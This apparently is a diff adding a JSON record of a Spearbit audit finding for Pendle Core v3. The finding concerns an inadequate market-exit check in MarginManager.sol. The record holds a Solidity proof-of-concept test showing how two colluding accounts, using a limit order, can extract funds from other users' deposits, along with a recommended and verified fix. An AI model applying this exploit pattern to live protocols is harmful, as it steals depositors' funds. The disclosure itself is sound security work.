@@ -1,0 +1,60 @@
+{
+    "id": 62143,
+    "kind": "PDF",
+    "auditfirm_id": 6,
+    "impact": "MEDIUM",
+    "finders_count": 4,
+    "protocol_id": 3384,
+    "title": "First market exit conditional check is inadequate",
+    "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`MarginManager.sol#L48`\n\n## Description\nThe first condition of requiring `margin.isZero()` and `signedSize == 0` isn't robust enough, as:\n- It is unlikely but possible for both the market `markRate` and `minMarginIndexRate` to be 0.\n- It doesn't account for the user's limit orders.\n\nThus, should both the `markRate` and `minMarginIndexRate` be 0, it allows a user to do the following:\n- Use an account A to...\n  1. Place a LONG / SHORT limit order (if interest rates are expected to be positive / negative respectively).\n  2. Exit the market and withdraw all funds.\n- Use an account B to fill that limit order and wait till maturity.\n\nSince the user has already withdrawn all funds from account A and account B has a positive net trade, the earnings from that trade, when withdrawn, will come from other users' deposits.\n\n## Proof of Concept\n```solidity\nfunction test_placeOrderAndExitMarket() public {\n    vm.startPrank(admin);\n    market0.setMinMarginIndexRate(0); // set min margin index rate to 0\n    setMarkRate(rateOracle, 0); // set mark rate to 0\n    \n    // Alice does the following:\n    // 1. place a LONG limit order\n    // 2. exit the market\n    // 3. withdraw all cash\n    vm.startPrank(alice);\n    router.placeOrderALO(true, market0Id, LONG, 1 ether, 500);\n    \n    // Alice is able to exit market, withdraw all funds\n    router.exitMarket(true, market0Id);\n    router.vaultTransfer(tokenId, uint256(marketHub.accCash(toCrossAcc(alice))), false);\n    assertEq(marketHub.accCash(toCrossAcc(alice)), 0);\n    \n    // Bob (Alice's alt account) fulfills the LONG order\n    // because Bob is short, he's paid upfront fixed cost\n    // hence basis of comparison is before order fulfillment\n    int256 bobCashBefore = marketHub.accCash(toCrossAcc(bob));\n    vm.startPrank(bob);\n    router.placeOrderFOK(true, market0Id, SHORT, 1 ether, 500);\n    vm.stopPrank();\n    \n    // fast forward to maturity\n    vm.warp(maturity + 1 days);\n    vm.prank(fIndexOracleUpdater);\n    FIndex index = indexOracle.getLatestFIndex();\n    uint32 timestamp = index.fTime();\n    int112 floatingRate = int112(1e16) * int112(uint112(maturity - timestamp)) / int112(365 days);\n    \n    vm.prank(fIndexOracleUpdater);\n    indexOracle.updateFloatingRate(floatingRate, maturity);\n    vm.prank(bob);\n    router.exitMarket(true, market0Id);\n    \n    // Bob is net positive\n    int256 bobCashAfter = marketHub.accCash(toCrossAcc(bob));\n    assertGt(bobCashAfter, bobCashBefore);\n    assertEq(marketHub.accCash(toCrossAcc(alice)), 0);\n}\n```\n\n## Recommendation\n- Consider requiring `minMarginIndexDuration` to be non-zero.\n- Consider returning and checking against `_getMaxPossibleAbsoluteSize()` instead of `signedSize`, so that limit orders are taken into account.\n\n## Acknowledgements\n- Pendle Finance: Fixed in commit `4f769483`. We now explicitly check for `signedSize == 0` and `nOrders = 0`.\n- Spearbit: Fix verified.",
+    "summary": "\nThis bug report is about a vulnerability in the MarginManager contract. The severity of this vulnerability is rated as medium risk. The issue is located in line 48 of the contract and the report suggests that the first condition of requiring `margin.isZero()` and `signedSize == 0` is not strong enough. This is because it is possible for both the market `markRate` and `minMarginIndexRate` to be 0, and it does not take into account the user's limit orders. This allows a user to exploit the system by placing a limit order, exiting the market, and withdrawing all funds, while another user fills the order and earns profits that come from other users' deposits. The report includes a proof of concept code to demonstrate this vulnerability. The recommendation is to require `minMarginIndexDuration` to be non-zero and to return and check against `_getMaxPossibleAbsoluteSize()` instead of `signedSize` to account for limit orders. The report also acknowledges that this vulnerability has been fixed in a recent commit and has been verified by Spearbit.",
+    "report_date": "2025-08-22T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Pendle-Spearbit-Security-Review-August-2025.pdf",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Pendle-Spearbit-Security-Review-August-2025.pdf",
+    "github_link": "",
+    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Pendle-Spearbit-Security-Review-August-2025.pdf",
+    "pdf_page_from": 9,
+    "contest_id": "",
+    "slug": "first-market-exit-conditional-check-is-inadequate-spearbit-none-pendle-core-v3-pdf",
+    "firm_name": "Spearbit",
+    "firm_logo_square": "spearbit_square.png",
+    "protocol_name": "Pendle Core v3",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Saw-mon and Natalie"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Ethan"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Desmond Ho"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "RustyRabbit"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Pendle Core v3",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
